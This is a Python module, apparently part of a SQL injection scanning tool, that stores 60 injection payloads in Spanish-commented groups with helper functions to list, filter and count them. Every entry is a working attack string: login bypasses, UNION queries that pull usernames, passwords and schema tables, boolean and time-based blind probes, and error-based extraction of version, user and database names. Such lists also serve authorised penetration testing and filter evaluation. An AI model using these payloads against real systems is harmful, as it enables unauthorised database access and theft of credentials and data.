"""
Módulo de Gestión de Payloads SQL Injection
Contiene exactamente 60 payloads organizados por tipo de ataque
"""

PAYLOADS = {
    'basic': [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1--",
        "' OR 'a'='a",
        "' OR 'a'='a'--",
        "' OR 'a'='a'/*",
        "1' OR '1'='1",
        "1' OR '1'='1'--"
    ],
    'union': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT user,pass--",
        "' UNION SELECT username,password--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "' UNION SELECT user()--",
        "' UNION SELECT NULL,@@version--",
        "' UNION SELECT NULL,NULL,@@version--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT * FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--"
    ],
    'boolean_blind': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND 1=1#",
        "' AND 1=2#",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ],
    'time_based': [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; WAITFOR DELAY '00:00:10'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT SLEEP(10)--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT pg_sleep(10)--",
        "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; (SELECT * FROM (SELECT(SLEEP(10)))a)--",
        "' OR SLEEP(5)--",
        "' OR SLEEP(10)--"
    ],
    'error_based': [
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=CAST(@@version AS int)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND 1=1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ]
}

def get_all_payloads():
    """Retorna todos los payloads como una lista plana"""
    all_payloads = []
    for category, payload_list in PAYLOADS.items():
        for payload in payload_list:
            all_payloads.append({
                'payload': payload,
                'type': category,
                'category': category
            })
    return all_payloads

def get_payloads_by_type(payload_type):
    """Retorna payloads de un tipo específico"""
    if payload_type not in PAYLOADS:
        return []
    return [{'payload': p, 'type': payload_type, 'category': payload_type} 
            for p in PAYLOADS[payload_type]]

def get_payload_count():
    """Retorna el número total de payloads"""
    return sum(len(payloads) for payloads in PAYLOADS.values())

def get_payloads_summary():
    """Retorna un resumen de los payloads por categoría"""
    return {
        'basic': len(PAYLOADS['basic']),
        'union': len(PAYLOADS['union']),
        'boolean_blind': len(PAYLOADS['boolean_blind']),
        'time_based': len(PAYLOADS['time_based']),
        'error_based': len(PAYLOADS['error_based']),
        'total': get_payload_count()
    }

